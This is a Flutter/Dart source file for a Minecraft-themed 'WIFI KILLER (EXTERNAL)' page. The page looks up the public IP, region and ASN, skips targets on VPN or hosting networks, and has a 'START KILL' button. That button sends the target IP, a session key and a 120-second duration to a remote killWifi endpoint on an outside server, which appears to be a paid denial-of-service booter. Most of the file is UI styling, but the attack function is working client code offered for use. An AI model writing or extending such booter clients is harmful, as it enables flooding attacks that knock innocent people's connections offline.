import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class WifiInternalPage extends StatefulWidget {
  final String sessionKey;
  const WifiInternalPage({super.key, required this.sessionKey});

  @override
  State<WifiInternalPage> createState() => _WifiInternalPageState();
}

class _WifiInternalPageState extends State<WifiInternalPage> {
  String publicIp = "-";
  String region = "-";
  String asn = "-";
  bool isVpn = false;
  bool isLoading = true;
  bool isAttacking = false;

  // ===== COLOR PALETTE - MINECRAFT THEME =====
  static const Color bgMain = Color(0xFF1A1A1A);
  static const Color bgSurface = Color(0xFF2D2D2D);
  static const Color bgCard = Color(0xFF3D3D3D);
  static const Color textMain = Color(0xFFE8E8E8);
  static const Color textSub = Color(0xFFAAAAAA);
  static const Color accentWhite = Color(0xFF4CAF50);
  static const Color borderLight = Color(0xFF5D5D5D);
  static const Color mcGold = Color(0xFFFFD700);
  static const Color mcDiamond = Color(0xFF4DD0E1);
  static const Color mcRedstone = Color(0xFFFF5252);
  static const Color mcEmerald = Color(0xFF00E676);
  static const Color mcOrange = Color(0xFFFF9800);

  @override
  void initState() {
    super.initState();
    _loadPublicInfo();
  }

  Future<void> _loadPublicInfo() async {
    setState(() {
      isLoading = true;
    });

    try {
      final ipRes = await http.get(Uri.parse("https://api.ipify.org?format=json"));
      final ipJson = jsonDecode(ipRes.body);
      final ip = ipJson['ip'];

      final infoRes = await http.get(Uri.parse("http://ip-api.com/json/$ip?fields=as,regionName,status,query"));
      final info = jsonDecode(infoRes.body);

      final asnRaw = (info['as'] as String).toLowerCase();
      final isBlockedAsn = asnRaw.contains("vpn") ||
          asnRaw.contains("cloud") ||
          asnRaw.contains("digitalocean") ||
          asnRaw.contains("aws") ||
          asnRaw.contains("google");

      setState(() {
        publicIp = ip;
        region = info['regionName'] ?? "-";
        asn = info['as'] ?? "-";
        isVpn = isBlockedAsn;
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        publicIp = region = asn = "Error";
        isLoading = false;
      });
    }
  }

  Future<void> _attackTarget() async {
    setState(() => isAttacking = true);
    final url = Uri.parse(
        "http://dwixclouds.cloudnesia.my.id:3013/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
    try {
      final res = await http.get(url);
      if (res.statusCode == 200) {
        _showAlert("Attack Sent", "WiFi attack sent to $publicIp");
      } else {
        _showAlert("Failed", "Server rejected request.");
      }
    } catch (e) {
      _showAlert("Error", "Network error: $e");
    } finally {
      setState(() => isAttacking = false);
    }
  }

  // ===== ALERT DIALOG - MINECRAFT =====
  void _showAlert(String title, String message) {
    final isSuccess = title.toLowerCase().contains("attack sent");
    final isError = title.toLowerCase().contains("error") ||
                    title.toLowerCase().contains("failed");
    final borderColor = isSuccess ? mcEmerald : (isError ? mcRedstone : mcGold);

    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.75),
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        elevation: 0,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: bgCard,
            borderRadius: BorderRadius.circular(4),
            border: Border.all(color: borderColor, width: 3),
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.8),
                blurRadius: 0,
                offset: const Offset(8, 8),
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: bgSurface,
                  border: Border.all(color: borderColor, width: 3),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.black.withOpacity(0.6),
                      blurRadius: 0,
                      offset: const Offset(4, 4),
                    )
                  ],
                ),
                child: Icon(
                  isSuccess
                      ? Icons.check_circle_outline
                      : (isError ? Icons.error_outline : Icons.info_outline),
                  color: borderColor,
                  size: 32,
                ),
              ),
              const SizedBox(height: 16),
              Text(
                title.toUpperCase(),
                style: const TextStyle(
                  color: textMain,
                  fontSize: 15,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1.5,
                  shadows: [
                    Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                  ],
                ),
              ),
              const SizedBox(height: 12),
              Text(
                message,
                style: const TextStyle(color: textSub, fontSize: 12),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 24),
              SizedBox(
                width: double.infinity,
                height: 50,
                child: ElevatedButton(
                  onPressed: () => Navigator.pop(context),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: borderColor,
                    foregroundColor: Colors.white,
                    shape: const RoundedRectangleBorder(
                      borderRadius: BorderRadius.zero,
                      side: BorderSide(color: Colors.black, width: 2),
                    ),
                    elevation: 0,
                  ),
                  child: const Text(
                    "OK",
                    style: TextStyle(
                      fontWeight: FontWeight.bold,
                      fontSize: 13,
                      letterSpacing: 1.5,
                      shadows: [
                        Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ===== INFO CARD - MINECRAFT =====
  Widget _infoCard(String title, String value, IconData icon) {
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: bgCard,
        border: Border.all(color: accentWhite, width: 3),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.7),
            blurRadius: 0,
            offset: const Offset(4, 4),
          ),
        ],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: bgSurface,
              border: Border.all(color: accentWhite, width: 2),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.5),
                  blurRadius: 0,
                  offset: const Offset(2, 2),
                )
              ],
            ),
            child: Icon(icon, color: accentWhite, size: 20),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  title.toUpperCase(),
                  style: const TextStyle(
                    color: textSub,
                    fontSize: 10,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 1,
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  value,
                  style: const TextStyle(
                    color: textMain,
                    fontSize: 12,
                    fontWeight: FontWeight.bold,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                    ],
                  ),
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgMain,
      appBar: AppBar(
        title: const Text(
          "WIFI KILLER (EXTERNAL)",
          style: TextStyle(
            fontWeight: FontWeight.bold,
            fontSize: 13,
            letterSpacing: 1.5,
            color: textMain,
            shadows: [
              Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
            ],
          ),
        ),
        backgroundColor: bgMain,
        elevation: 0,
        iconTheme: const IconThemeData(color: textMain),
        leading: IconButton(
          icon: Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: bgCard,
              border: Border.all(color: accentWhite, width: 2),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.6),
                  blurRadius: 0,
                  offset: const Offset(2, 2),
                )
              ],
            ),
            child: const Icon(Icons.arrow_back_ios_new, color: textMain, size: 16),
          ),
          onPressed: () => Navigator.pop(context),
        ),
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(3),
          child: Container(height: 3, color: accentWhite),
        ),
      ),
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [bgMain, bgSurface, bgMain],
          ),
        ),
        child: Padding(
          padding: const EdgeInsets.all(16),
          child: isLoading
              ? const Center(
                  child: CircularProgressIndicator(
                    color: accentWhite,
                    strokeWidth: 3,
                  ),
                )
              : SingleChildScrollView(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.stretch,
                    children: [
                      // HEADER - MINECRAFT
                      Row(
                        children: [
                          Container(
                            padding: const EdgeInsets.all(8),
                            decoration: BoxDecoration(
                              color: bgCard,
                              border: Border.all(color: accentWhite, width: 3),
                              boxShadow: [
                                BoxShadow(
                                  color: Colors.black.withOpacity(0.7),
                                  blurRadius: 0,
                                  offset: const Offset(4, 4),
                                )
                              ],
                            ),
                            child: const Icon(Icons.public, color: accentWhite, size: 22),
                          ),
                          const SizedBox(width: 12),
                          const Text(
                            "SYSTEM INFORMATION",
                            style: TextStyle(
                              color: textMain,
                              fontSize: 13,
                              fontWeight: FontWeight.bold,
                              letterSpacing: 1.5,
                              shadows: [
                                Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                              ],
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 20),

                      // INFO CARDS
                      _infoCard("IP Address", publicIp, Icons.language),
                      _infoCard("Region", region, Icons.map),
                      _infoCard("ASN", asn, Icons.storage),

                      const SizedBox(height: 20),

                      // VPN WARNING - MINECRAFT
                      if (isVpn)
                        Container(
                          padding: const EdgeInsets.all(16),
                          decoration: BoxDecoration(
                            color: bgCard,
                            border: Border.all(color: mcRedstone, width: 3),
                            boxShadow: [
                              BoxShadow(
                                color: Colors.black.withOpacity(0.7),
                                blurRadius: 0,
                                offset: const Offset(5, 5),
                              ),
                              BoxShadow(
                                color: mcRedstone.withOpacity(0.3),
                                blurRadius: 15,
                                spreadRadius: 1,
                              ),
                            ],
                          ),
                          child: Column(
                            children: [
                              Container(
                                padding: const EdgeInsets.all(12),
                                decoration: BoxDecoration(
                                  color: bgSurface,
                                  border: Border.all(color: mcRedstone, width: 3),
                                  boxShadow: [
                                    BoxShadow(
                                      color: Colors.black.withOpacity(0.5),
                                      blurRadius: 0,
                                      offset: const Offset(3, 3),
                                    )
                                  ],
                                ),
                                child: const Icon(
                                  Icons.warning_amber_rounded,
                                  color: mcRedstone,
                                  size: 32,
                                ),
                              ),
                              const SizedBox(height: 16),
                              const Text(
                                "VPN / HOSTING DETECTED",
                                style: TextStyle(
                                  color: mcRedstone,
                                  fontSize: 13,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 1.5,
                                  shadows: [
                                    Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                                  ],
                                ),
                              ),
                              const SizedBox(height: 8),
                              const Text(
                                "Target berasal dari VPN/Hosting.\nSerangan dibatalkan.",
                                textAlign: TextAlign.center,
                                style: TextStyle(
                                  color: textSub,
                                  fontSize: 11,
                                ),
                              ),
                            ],
                          ),
                        ),

                      // ATTACK BUTTON - MINECRAFT
                      if (!isVpn)
                        Container(
                          decoration: BoxDecoration(
                            color: bgCard,
                            border: Border.all(color: accentWhite, width: 3),
                            boxShadow: [
                              BoxShadow(
                                color: Colors.black.withOpacity(0.7),
                                blurRadius: 0,
                                offset: const Offset(5, 5),
                              ),
                            ],
                          ),
                          padding: const EdgeInsets.all(16),
                          child: SizedBox(
                            width: double.infinity,
                            height: 58,
                            child: ElevatedButton.icon(
                              onPressed: isAttacking ? null : _attackTarget,
                              icon: Icon(
                                isAttacking ? Icons.hourglass_top : Icons.wifi_off,
                                color: Colors.white,
                                size: 24,
                              ),
                              label: Text(
                                isAttacking ? "ATTACKING..." : "START KILL",
                                style: const TextStyle(
                                  fontWeight: FontWeight.bold,
                                  fontSize: 13,
                                  letterSpacing: 1.5,
                                  color: Colors.white,
                                  shadows: [
                                    Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                                  ],
                                ),
                              ),
                              style: ElevatedButton.styleFrom(
                                backgroundColor: accentWhite,
                                foregroundColor: Colors.white,
                                shape: const RoundedRectangleBorder(
                                  borderRadius: BorderRadius.zero,
                                  side: BorderSide(color: Colors.black, width: 3),
                                ),
                                elevation: 0,
                              ),
                            ),
                          ),
                        ),
                    ],
                  ),
                ),
        ),
      ),
    );
  }
}